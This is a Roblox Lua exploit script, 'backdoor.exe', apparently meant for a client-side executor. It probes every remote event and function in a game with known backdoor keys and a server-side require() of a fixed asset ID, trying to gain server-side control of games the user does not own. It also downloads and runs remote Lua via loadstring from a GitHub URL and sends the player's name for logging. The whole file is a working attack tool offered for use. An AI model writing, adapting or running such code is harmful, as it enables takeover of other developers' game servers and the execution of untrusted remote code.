--[[
    backdoor.exe, the best backdoor scanner in Roblox.
    Copyright (C) 2021	iK4oS

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
]]

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local JointsService = game:GetService("JointsService")
local StarterGui = game:GetService("StarterGui")

local LocalPlayer = game:GetService("Players").LocalPlayer
local requireScript = ("require(8472875238):k4scripts('%s', %s)"):format(LocalPlayer.Name, "true") -- set true to false to disable logging
local invCode = "6HndYgC"

local alternativeSS = {
	run = { [1] = "5#lGIERKWEF" },
	emma = { [1] = "pwojr8hoc0-gr0yxohlgp-0feb7ncxed", [2] = ",,,,,,,,,,,,,,," },
	helpme = { [1] = "helpme" },
	pickett = { [1] = "cGlja2V0dA==" },
	harked = "https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/harkedSS.lua"
}

local function notify(text)
	StarterGui:SetCore(
	"SendNotification",
		{
			Title = "backdoor.exe",
			Duration = 3,
			Text = text
		}
	)
end

local function attached(possibleWait)
	if possibleWait then task.wait(possibleWait) end
	return LocalPlayer.PlayerGui:FindFirstChild("backdoor.exe")
end

local function validRemote(rm, _className)
    if rm.ClassName ~= _className then return false end
    
	local fullName =  rm:GetFullName()
	
	if string.find(fullName, "DefaultChat") then return false end
	if string.find(fullName, LocalPlayer.Name) then return false end
	local Parent = rm.Parent
	if (rm:FindFirstChild("__FUNCTION") and Parent == ReplicatedStorage) or (rm.Name == "__FUNCTION" and Parent and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then return false end
	if Parent == JointsService then return false end

	if getgenv().blacklisted then
		if table.find(getgenv().blacklisted, fullName) then return false end
	end

	return true
end

local function harked()
	local backpack = LocalPlayer.Backpack 
	return backpack:FindFirstChild("HandlessSegway") and
		Backpack.HandlessSegway:FindFirstChild("RemoteEvents") and
		Backpack.HandlessSegway.RemoteEvents:FindFirstChild("DestroySegway")
end
local function emmaBackdoor(rm)
	return rm.Name == "emma" and rm.Parent.Name == "mynameemma"
end

local function runBackdoor(rm)
    local Parent = rm.Parent
	return rm.Name == "Run" and Parent and
	Parent:FindFirstChild("Pages") and Parent:FindFirstChild("R6") and
	Parent:FindFirstChild("Version") and Parent:FindFirstChild("Title")
end

local function httpRequest(url)
    if syn and syn.request then return syn.request({Url=url}).Body
    elseif request then return request({Url=url}).Body
    else return game:HttpGetAsync(url) end
end

local function scanGame()
    notify("Scanning for a backdoor.")
    
	if harked() then
		loadstring(httpRequest(alternativeSS.harked))()
		return
	end

	for _, remote in pairs(game:GetDescendants()) do
		if not attached() and validRemote(remote, "RemoteEvent") then
			if emmaBackdoor(remote) then
				remote:FireServer(unpack(alternativeSS.emma), requireScript)
			end
			if not attached() and runBackdoor(remote) then
				remote:FireServer(unpack(alternativeSS.run), requireScript)
			end

			if not attached() then remote:FireServer(unpack(alternativeSS.helpme), requireScript) end
			if not attached() then remote:FireServer(unpack(alternativeSS.pickett), requireScript) end
			if not attached() then remote:FireServer(requireScript) end
		end
		
		if not attached() and validRemote(remote, "RemoteFunction") then
			waiting = true
			task.spawn(function()
			    remote:InvokeServer(requireScript)
			    waiting = nil
			end)
			local start = os.time()
			while waiting and 5 > os.time() - start do -- If RemoteFunction don't respond in 5 seconds, we skip this one.
			    task.wait()
			end
		end
	end
end

local function Main()
	notify(("Make sure to join our Discord!\nCode: %s"):format(invCode))

	scanGame()
	
	if not attached(2) then
		notify("Unable to find backdoor.\nGame not backdoored?")
	end
end

if game:IsLoaded() then
	pcall(Main)
end

--	k4scripts
--	.------.
--	|4.--. |
--	| :│/: |
--	| :│\: |
--	| '--'4|
--	`------'
